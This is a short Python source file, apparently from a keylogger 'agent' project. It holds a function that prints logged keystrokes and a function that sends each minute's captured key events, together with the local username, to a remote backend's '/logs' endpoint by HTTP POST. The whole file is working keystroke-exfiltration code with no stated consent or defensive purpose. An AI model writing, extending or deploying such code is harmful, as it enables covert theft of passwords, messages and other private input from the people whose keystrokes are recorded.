from getpass import getuser

import requests

from agent import consts


def print_key_log(list_minute_of_keys):


    print(list_minute_of_keys)
    # for i, minute_of_keys in enumerate(list_minute_of_keys):
    #     for key, value in minute_of_keys.items():
    #         if i == len(list_minute_of_keys)-1:
    #             value = value[:-4]
    #         print("*****", key, "*****")
    #         print(value)


def send_logs_to_backend(list_minute_of_keys):
    username = getuser()

    for minute in list_minute_of_keys:
        items = list(minute.items())[0]
        print(list(items))
        data = {
            "time": items[0],
            "events": items[1],
            "machine": username,
        }
        requests.post(consts.API_BASE_URL + "/logs", json=data)